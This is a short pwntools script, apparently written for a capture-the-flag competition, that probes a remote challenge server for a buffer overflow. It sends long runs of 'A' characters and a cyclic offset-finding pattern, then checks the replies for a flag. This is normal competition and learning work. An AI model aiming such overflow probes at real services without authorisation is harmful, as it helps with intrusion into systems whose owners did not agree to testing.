#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

host = "chals.uscc-cyberbowl-2025.ctf.institute"
port = 3015

# The win function address needs to be found, but let's try a basic overflow first
# Common addresses for 32-bit binaries start around 0x08048000

def test_overflow(payload):
    print(f"\n{'='*60}")
    print(f"Testing overflow with payload length: {len(payload)}")
    print(f"{'='*60}")
    
    try:
        conn = remote(host, port, timeout=10)
        conn.recvuntil(b":")
        
        # Send the overflow payload
        conn.sendline(payload)
        sleep(0.5)
        
        try:
            data = conn.recvall(timeout=3)
            output = data.decode('utf-8', errors='ignore')
            print(output)
            
            if 'USCC{' in output or 'RAIDER' in output:
                print("\n" + "!"*60)
                print("FLAG FOUND!")
                print("!"*60)
                print(output)
                return True
        except Exception as e:
            print(f"Receive error: {e}")
        
        conn.close()
    except Exception as e:
        print(f"Error: {e}")
    
    return False

# Try simple overflow patterns
payloads = [
    b"A" * 100,
    b"A" * 200,
    b"A" * 500,
   # Cyclic pattern to find offset
    cyclic(200),
]

for payload in payloads:
    if test_overflow(payload):
        break
